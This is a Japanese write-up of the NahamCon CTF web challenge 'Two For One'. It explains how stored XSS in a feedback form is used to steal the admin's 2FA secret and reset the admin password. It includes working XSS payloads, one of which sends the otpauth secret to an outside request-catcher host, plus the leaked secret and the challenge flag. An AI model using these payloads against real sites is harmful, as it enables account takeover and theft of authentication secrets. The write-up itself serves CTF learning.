# Two For One:Web:473pts
Need to keep things secure? Try out our safe, the most secure in the world!  

**Connect with:**  
- [http://challenge.nahamcon.com:31211](http://challenge.nahamcon.com:31211/)  

# Solution
URLが与えられる。  
アカウント登録し、Username、Password、2FA OTPの三つを入力するとログインできる。  
Secretsなるものを投稿したり、閲覧したりできるようだ。  
Fort Knox  
[site1.png](site/site1.png)  
[site2.png](site/site2.png)  
Secrets部分でXSSはできそうにないが、SettingsページにFeedbackなる怪しい機能がある。  
[site3.png](site/site3.png)  
ここで以下を入力し送信することで、XSSを試す。  
リクエスト待ち受けは[RequestBin.com](https://requestbin.com/)を用いた。  
```html
<script>
fetch("https://xxxxxxxxxxxxx.x.pipedream.net");
</script>
```
するとリクエストが到達した。  
XSSが狙えるが、cookieには何も保存されていない。  
Settingsページで管理者のパスワードを変更すればログインできるが、変更にはOTPが必要なようで、Usernameも分からない。  
ここでSettingsページにReset 2FAがあることに気づく。  
挙動を確認してみるとどうやら`/reset2fa`にPOSTを行っており、otpauth URIが返ってくる。  
これを奪うことを考える。  
CSRFトークンなどがあると一度それを取得しなければならないが、どうやら無いようだ。  
Feedbackから管理者のotpauth URIを奪うスクリプトを以下のように投げる。  
```html
<script>
fetch("http://challenge.nahamcon.com:31211/reset2fa", {method:"POST"}).then(res => res.text()).then(text => fetch("https://xxxxxxxxxxxxx.x.pipedream.net?s=" + text));
</script>
```
以下が待ち受けたサーバに届いた。  
```
/?s={%22url%22:%22otpauth://totp/Fort%20Knox:admin?secret=5AXOD3E57PGUZCE2&issuer=Fort%20Knox%22}
```
Usernameはadminのようだ。  
これでadminのOTPが計算できる。  
[One-Time Password Calculator](https://cryptotools.net/otp)などにSecretである`5AXOD3E57PGUZCE2`を渡してやればよい。  
ここから再度adminのパスワードを変更することを狙う。  
以下のスクリプトのotpに現時点でのadminのOTPを設定し、Feedbackから投げる。  
ここでは`279966`であった。  
```html
<script>
fetch("http://challenge.nahamcon.com:31211/reset_password", {
    "headers": {"Content-Type": "application/json"},
    "body": "{\"otp\":\"279966\",\"password\":\"satoki\",\"password2\":\"satoki\"}",
    "method": "POST"
});
</script>
```
これでadminのパスワードが`satoki`に変更されているはずである。  
変動するOTPとともにログインしてやるとFlagというものがあるようだ。  
flag  
[flag.png](site/flag.png)  
OTPを使い閲覧すると、flagが得られた。  

## flag{96710ea6be916326f96de003c1cc97cb}